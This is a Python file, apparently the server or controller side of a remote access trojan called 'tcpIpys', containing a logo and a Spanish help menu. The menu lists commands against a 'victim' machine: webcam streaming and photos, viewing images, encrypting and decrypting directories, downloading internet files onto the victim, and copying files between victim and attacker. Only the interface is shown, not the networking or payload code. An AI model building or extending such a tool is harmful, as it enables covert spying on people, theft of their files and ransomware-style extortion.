## Server
from colorama import init
from colorama.ansi import Fore

init(autoreset=True)

def logo():
    print(Fore.BLUE   + "▄▄▄█████▓ ▄████▄   ██▓███   ██▓ ██▓███ ▓██   ██▓")
    print(Fore.BLUE   + "▓  ██▒ ▓▒▒██▀ ▀█  ▓██░  ██▒▓██▒▓██░  ██▒▒██  ██▒")
    print(Fore.YELLOW + "▒ ▓██░ ▒░▒▓█    ▄ ▓██░ ██▓▒▒██▒▓██░ ██▓▒ ▒██ ██░")
    print(Fore.YELLOW + "░ ▓██▓ ░ ▒▓▓▄ ▄██▒▒██▄█▓▒ ▒░██░▒██▄█▓▒ ▒ ░ ▐██▓░")
    print(Fore.RED    + "  ▒██▒ ░ ▒ ▓███▀ ░▒██▒ ░  ░░██░▒██▒ ░  ░ ░ ██▒▓░")
    print(Fore.RED    + "  ▒ ░░   ░ ░▒ ▒  ░▒▓▒░ ░  ░░▓  ▒▓▒░ ░  ░  ██▒▒▒ ")
    print(Fore.RED    + "    ░      ░  ▒   ░▒ ░      ▒ ░░▒ ░     ▓██ ░▒░ ")
    print(Fore.RED    + "  ░      ░        ░░        ▒ ░░░       ▒ ▒ ░░  ")
    print(Fore.RED    + "         ░ ░                ░           ░ ░     ")
    print(Fore.RED    + "         ░                              ░ ░     ")

def man():
    print(Fore.BLUE + "comand" + Fore.RED + " --> " + Fore.WHITE + "Comando")
    print(Fore.MAGENTA + "comand" + Fore.RED + " --> " + Fore.WHITE + "Ejemplo de comando")
    print(Fore.YELLOW + "*" + Fore.RED + " --> " + Fore.WHITE + "Parametro obligatorio")
    print(Fore.GREEN + "+" + Fore.RED + " --> " + Fore.WHITE + "Parametro opcional")
    print()

    print(Fore.BLUE + "--help/-h/help" + Fore.RED + " --> " + Fore.WHITE + "Despliega este mensaje de ayuda")
    print(Fore.MAGENTA + "\ttcpIpys --help ~~ tcpIpys -h ~~ (dentro del programa)> help")

    print(Fore.BLUE + "tcpIpys" + Fore.RED + " --> " + Fore.WHITE + "Se ejecuta el programa con los parametros por default")
    print(Fore.BLUE + "tcpIpys <ipv4> <port>" + Fore.RED + " --> " + Fore.WHITE + "Se ejecuta el programa con los parametros especificados")
    print(Fore.MAGENTA + "\t<ipv4> --> 127.0.0.1 ~~ <port> --> 2048")
    print()

    print(Fore.BLUE + "!" + Fore.RED + " --> " + Fore.WHITE + "Ejecuta un comando local despues del simbolo")
    print(Fore.MAGENTA + "\t!cd ..")

    print(Fore.BLUE + "cap" + Fore.RED + " --> " + Fore.WHITE + "Muestra un video de alguna camara web de la maquina de la victima")
    print(Fore.YELLOW + "\t* -c" + Fore.RED + " --> " + Fore.WHITE + "Especifica la camara que se quiere utilizar")
    print(Fore.MAGENTA + "\tcap -c 0 ~~ cap -c 1")

    print(Fore.BLUE + "cd" + Fore.RED + " --> " + Fore.WHITE + "Cambia el directorio de la victima al especificado")
    print(Fore.MAGENTA + "\tcd Escritorio")

    print(Fore.BLUE + "clear/cls/clc" + Fore.RED + " --> " + Fore.WHITE + "Limpia la pantalla")
    print(Fore.MAGENTA + "\tclear/cls/clc")

    print(Fore.BLUE + "decrypt" + Fore.RED + " --> " + Fore.WHITE + "Desencripta los archivos de un directorio de la victima")
    print(Fore.YELLOW + "\t* -k" + Fore.RED + " --> " + Fore.WHITE + "Especifica el nombre de la llave de desencriptacion")
    print(Fore.YELLOW + "\t* -d" + Fore.RED + " --> " + Fore.WHITE + "Especifica el directorio a desencriptar")
    print(Fore.MAGENTA + "\tdencrypt -k llave.key -d .")

    print(Fore.BLUE + "encrypt" + Fore.RED + " --> " + Fore.WHITE + "Encripta los archivos de un directorio de la victima")
    print(Fore.YELLOW + "\t* -k" + Fore.RED + " --> " + Fore.WHITE + "Especifica el nombre de la llave de encriptacion")
    print(Fore.YELLOW + "\t* -e" + Fore.RED + " --> " + Fore.WHITE + "Especifica el directorio a encriptar")
    print(Fore.MAGENTA + "\tencrypt -k llave.key -e .")

    print(Fore.BLUE + "exit" + Fore.RED + " --> " + Fore.WHITE + "Termina el programa en ambos extremos")
    print(Fore.MAGENTA + "\texit")

    print(Fore.BLUE + "img" + Fore.RED + " --> " + Fore.WHITE + "Se muestra una imagen especificada de la maquina de la victima")
    print(Fore.YELLOW + "\t* -i" + Fore.RED + " --> " + Fore.WHITE + "Especifica la ruta de la imagen de la victima")
    print(Fore.GREEN + "\t+ -t" + Fore.RED + " --> " + Fore.WHITE + "Sirve para asignar la escala de la imagen")
    print(Fore.GREEN + "\t+ -r=" + Fore.RED + " --> " + Fore.WHITE + "Elige una imagen del directorio actual de manera aleatoria")
    print(Fore.GREEN + "\t+ -90" + Fore.RED + " --> " + Fore.WHITE + "Gira la imagen 90 grados")
    print(Fore.GREEN + "\t+ -180" + Fore.RED + " --> " + Fore.WHITE + "Gira la imagen 180 grados")
    print(Fore.GREEN + "\t+ -270" + Fore.RED + " --> " + Fore.WHITE + "Gira la imagen 270 grados")
    print(Fore.GREEN + "\t+ -x" + Fore.RED + " --> " + Fore.WHITE + "Gira la imagen en el eje x")
    print(Fore.GREEN + "\t+ -y" + Fore.RED + " --> " + Fore.WHITE + "Gira la imagen en el eje y")
    print(Fore.GREEN + "\t+ -g" + Fore.RED + " --> " + Fore.WHITE + "Cambia el color de la imagen a escala de grises")
    print(Fore.GREEN + "\t+ -n" + Fore.RED + " --> " + Fore.WHITE + "Cambia el color de la imagen al negativo")
    print(Fore.GREEN + "\t+ -m" + Fore.RED + " --> " + Fore.WHITE + "Efecto espejo")
    print(Fore.GREEN + "\t+ -c" + Fore.RED + " --> " + Fore.WHITE + "Deteccion de bordes con algoritmo Canny")
    print(Fore.MAGENTA + "\timg -i imagen.jpg ~~ img -r= ~~ img -g -i imagen.jpg -t=0.5")

    print(Fore.BLUE + "lendir" + Fore.RED + " --> " + Fore.WHITE + "Muestra al numero de elementos de un directorio")
    print(Fore.MAGENTA + "\tlendir dirPath")

    print(Fore.BLUE + "miwget" + Fore.RED + " --> " + Fore.WHITE + "Descarga un archivo de internet en la maquina de la victima")
    print(Fore.YELLOW + "\t* -u" + Fore.RED + " --> " + Fore.WHITE + "Especifica la url del archivo")
    print(Fore.GREEN + "\t+ -n" + Fore.RED + " --> " + Fore.WHITE + "Especifica el nombre del archivo")
    print(Fore.MAGENTA + "\tmiwget -u=<url> ~~ miwget -u <url> -n wget.pdf")

    print(Fore.BLUE + "pic" + Fore.RED + " --> " + Fore.WHITE + "Toma una foto con alguna camara web de la maquina de la victima")
    print(Fore.YELLOW + "\t* -c" + Fore.RED + " --> " + Fore.WHITE + "Especifica la camara que se quiere usar")
    print(Fore.GREEN + "\t+ -s" + Fore.RED + " --> " + Fore.WHITE + "Indica si se quiere guardar la foto")
    print(Fore.MAGENTA + "\tpic -c 0 ~~ pic -s -c=1")

    print(Fore.BLUE + "q/quit" + Fore.RED + " --> " + Fore.WHITE + "Termina la conexion con la victima, pero no el programa")
    print(Fore.MAGENTA + "\tq/quit")

    print(Fore.BLUE + "save" + Fore.RED + " --> " + Fore.WHITE + "Guarda en un archivo de texto la informacion regresada por un comando")
    print(Fore.MAGENTA + "\tsave whoami")

    print(Fore.BLUE + "sdf" + Fore.RED + " --> " + Fore.WHITE + "Envia los archivos de un directorio de la victima al atacante")
    print(Fore.YELLOW + "\t* -o" + Fore.RED + " --> " + Fore.WHITE + "Especifica el directorio origen de la maquina de la victima")
    print(Fore.GREEN + "\t+ -d" + Fore.RED + " --> " + Fore.WHITE + "Especifica el directorio destino de la maquina del atacante")
    print(Fore.GREEN + "\t+ -i" + Fore.RED + " --> " + Fore.WHITE + "Indica el indice desde el que se quiere iniciar al envio de archivos")
    print(Fore.GREEN + "\t+ -a=" + Fore.RED + " --> " + Fore.WHITE + "Indica si se quieren enviar los archivos de forma automatica")
    print(Fore.MAGENTA + "\t sdf -o directorioOrigen ~~ sdf -a= -o dirOrigen -d dirDestino -i=4")

    print(Fore.BLUE + "sdt" + Fore.RED + " --> " + Fore.WHITE + "Envia los archivos de un directorio del atacante a la victima")
    print(Fore.YELLOW + "\t* -o" + Fore.RED + " --> " + Fore.WHITE + "Especifica el directorio origen de la maquina del atacante")
    print(Fore.GREEN + "\t+ -d" + Fore.RED + " --> " + Fore.WHITE + "Especifica el directorio destino de la maquina de la victima")
    print(Fore.GREEN + "\t+ -i" + Fore.RED + " --> " + Fore.WHITE + "Indica el indice desde el que se quiere iniciar al envio de archivos")
    print(Fore.GREEN + "\t+ -a=" + Fore.RED + " --> " + Fore.WHITE + "Indica si se quieren enviar los archivos de forma automatica")
    print(Fore.MAGENTA + "\t sdf -o directorioOrigen ~~ sdf -a= -o dirOrigen -d dirDestino -i=4")

    print(Fore.BLUE + "sff" + Fore.RED + " --> " + Fore.WHITE + "Envia un archivo de la victima al atacante")
    print(Fore.YELLOW + "\t* -o" + Fore.RED + " --> " + Fore.WHITE + "Especifica la ruta del archivo de la victima")
    print(Fore.GREEN + "\t+ -d" + Fore.RED + " --> " + Fore.WHITE + "Especifica la ruta destino en la maquina del atacante (si no se agrega este parametro, el nombre del archivo se mantiene igual)")
    print(Fore.MAGENTA + "\tsff -o origen.txt ~~ sff -o origen.txt -d destino.txt")

    print(Fore.BLUE + "sft" + Fore.RED + " --> " + Fore.WHITE + "Envia un archivo del atacante a la victima")
    print(Fore.YELLOW + "\t* -o" + Fore.RED + " --> " + Fore.WHITE + "Especifica la ruta del archivo del atacante")
    print(Fore.GREEN + "\t+ -d" + Fore.RED + " --> " + Fore.WHITE + "Especifica la ruta de destino en la maquina de la victima (si no se agrega este parametro, el nombre del archivo no cambia)")
    print(Fore.MAGENTA + "\tsft -o origen.txt ~~ sft -o origen.txt -d destino.txt")

    print(Fore.BLUE + "unzip" + Fore.RED + " --> " + Fore.WHITE + "Decomprime un archivo .zip")
    print(Fore.YELLOW + "\t* -o" + Fore.RED + " --> " + Fore.WHITE + "Especifica el archivo .zip de origen")
    print(Fore.GREEN + "\t+ -d" + Fore.RED + " --> " + Fore.WHITE + "Especifica el directorio destino")
    print(Fore.MAGENTA + "\tunzip -o archivo.zip ~~ unzip -o=archivo.zip -d=dirDestino")

    print(Fore.BLUE + "zip" + Fore.RED + " --> " + Fore.WHITE + "Comprime los archivos de un directorio de la victima")
    print(Fore.YELLOW + "\t* -o" + Fore.RED + " --> " + Fore.WHITE + "Especifica el archivo o directorio a comprimir")
    print(Fore.GREEN + "\t+ -d" + Fore.RED + " --> " + Fore.WHITE + "Especifica el archivo .zip de destino")
    print(Fore.MAGENTA + "\tzip -o archivo.pdf ~~ zip -o=dirOrigen -d=archivo.zip")

